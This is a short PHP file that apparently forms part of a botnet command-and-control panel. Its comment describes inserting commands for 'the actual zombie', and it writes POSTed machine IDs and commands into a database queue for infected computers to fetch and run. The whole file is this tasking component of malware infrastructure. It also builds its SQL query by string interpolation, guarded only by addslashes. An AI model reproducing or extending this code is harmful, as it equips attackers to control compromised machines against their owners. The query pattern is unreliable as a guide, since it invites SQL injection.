<?php 
# insert cmd for the actual zombie (auto-pilot mode OR scenario driven)
include("conn.php");
if(isset($_POST['pc'])) {$pc=addslashes(html_entity_decode($_POST['pc']));}
if(isset($_POST['cmd'])) {$cmd=addslashes(html_entity_decode($_POST['cmd']));}
if(isset($_POST['id'])) {$id=addslashes(html_entity_decode($_POST['id']));}

mysqli_query($bdd, "INSERT INTO commands (`id`, `pc` , `cmd` , `result` , `ok`) VALUES ('', '$pc', '$cmd', '', '0')");
mysqli_close($bdd); 
?>
